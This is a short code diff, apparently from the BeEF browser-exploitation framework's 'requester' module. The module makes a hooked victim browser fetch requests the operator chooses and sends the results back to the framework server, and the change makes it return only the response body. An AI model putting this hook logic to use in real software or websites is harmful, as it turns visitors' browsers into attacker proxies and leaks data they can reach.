@@ -15,7 +15,7 @@ beef.net.requester = {
 	send: function(requests_array) {
 		for(i in requests_array) {
 			request = requests_array[i];
-			beef.net.request('http', request.method, request.host, request.port, request.uri, null, null, 10, 'HTML', function(res) { beef.net.send('/requester', request.id, res);  });
+			beef.net.request('http', request.method, request.host, request.port, request.uri, null, null, 10, 'HTML', function(res) { beef.net.send('/requester', request.id, res.response_body);  });
 		}
 	}
 };
